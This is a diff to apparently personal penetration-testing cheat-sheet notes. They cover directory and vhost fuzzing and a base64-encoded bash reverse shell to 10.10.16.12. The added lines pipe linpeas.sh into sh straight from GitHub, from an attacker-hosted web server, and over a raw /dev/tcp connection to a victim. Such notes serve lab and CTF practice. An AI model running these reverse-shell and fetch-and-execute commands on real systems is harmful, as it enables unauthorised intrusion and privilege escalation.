@@ -9,6 +9,8 @@ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u
 gobuster vhost -u http://domain.domain \
 -w ~/Downloads/subdomains \
 --append-domain -t 50
+
+
 ffuf -c -ac -w ~/Downloads/subdomains-10000.txt -H 'Host: FUZZ.domain.name' -u http://domainname 
 
 ## ssh pivot
@@ -19,3 +21,16 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 base64
 echo -n 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1' | base64 
+
+## leanpeas path
+cd /usr/share/peass/
+## From public github
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+## Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+## Without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
